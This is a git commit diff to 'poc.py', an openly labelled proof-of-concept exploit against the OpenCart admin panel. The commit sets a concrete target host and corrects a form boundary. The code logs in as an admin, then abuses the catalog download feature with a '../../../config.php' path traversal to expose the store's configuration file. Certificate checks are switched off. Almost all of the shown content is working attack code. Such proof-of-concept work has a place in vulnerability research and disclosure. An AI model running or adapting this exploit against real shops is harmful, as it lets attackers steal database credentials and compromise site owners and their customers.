ab142e1cc0239579d2c2149c10d6b699b2a11142
sakuratimo <787886660@qq.com>
2020-04-19 01:14:13 +0800

    change poc_7-1

--- resource/poc.py
+++ resource/poc.py
@@ -1,7 +1,7 @@
 import requests
 import urllib3
 requests.packages.urllib3.disable_warnings()
-host = "opencart"
+host = "opencart66.com"
 
 def loginad():
    burp0_url = "https://"+host+":443/admin/index.php?route=common/login"
@@ -41,7 +41,7 @@ def loginad():
 def addfile(adcookies,adtoken):
     burp0_url = "https://"+host+":443//admin/index.php?route=catalog/download/add&user_token="+adtoken
     burp0_cookies = {"OCSESSID": adcookies, "__atuvc": "1%7C12%2C0%7C13%2C1%7C14", "currency": "USD", "language": "en-gb"}
-    burp0_headers = {"Origin": "https://"+host, "Referer": "https://"+host+"/admin/index.php?route=catalog/download/add&user_token="+adtoken, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "multipart/form-data; boundary=---------------------------7e4e614b0306", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Cache-Control": "no-cache"}
+    burp0_headers = {"Origin": "https://"+host, "Referer": "https://"+host+"/admin/index.php?route=catalog/download/add&user_token="+adtoken, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJ0kpr6vfuOQJuvkE", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Cache-Control": "no-cache"}
     burp0_data = "------WebKitFormBoundaryJ0kpr6vfuOQJuvkE\r\nContent-Disposition: form-data; name=\"download_description[1][name]\"\r\n\r\nfile_poc_2020\r\n------WebKitFormBoundaryJ0kpr6vfuOQJuvkE\r\nContent-Disposition: form-data; name=\"filename\"\r\n\r\n../../../config.php\r\n------WebKitFormBoundaryJ0kpr6vfuOQJuvkE\r\nContent-Disposition: form-data; name=\"mask\"\r\n\r\n1111\r\n------WebKitFormBoundaryJ0kpr6vfuOQJuvkE--\r\n"
     r=requests.post(burp0_url, headers=burp0_headers,cookies=burp0_cookies,data=burp0_data,verify=False)
     #print(r.status_code)
@@ -49,7 +49,7 @@ def addfile(adcookies,adtoken):
 
     burp0_url = "https://"+host+":443/admin/index.php?route=catalog/download&user_token="+adtoken
     burp0_cookies = {"currency": "USD", "__atuvc": "2%7C15", "language": "en-gb", "OCSESSID": adcookies}
-    burp0_headers = {"Origin": "https://"+host, "Referer": "https://"+host+"/admin/index.php?route=catalog/download/add&user_token="+adtoken, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "multipart/form-data; boundary=---------------------------7e4e614b0306", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Cache-Control": "no-cache"}
+    burp0_headers = {"Origin": "https://"+host, "Referer": "https://"+host+"/admin/index.php?route=catalog/download/add&user_token="+adtoken, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJ0kpr6vfuOQJuvkE", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Cache-Control": "no-cache"}
     r_check=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
     print("add file")
     return r_check
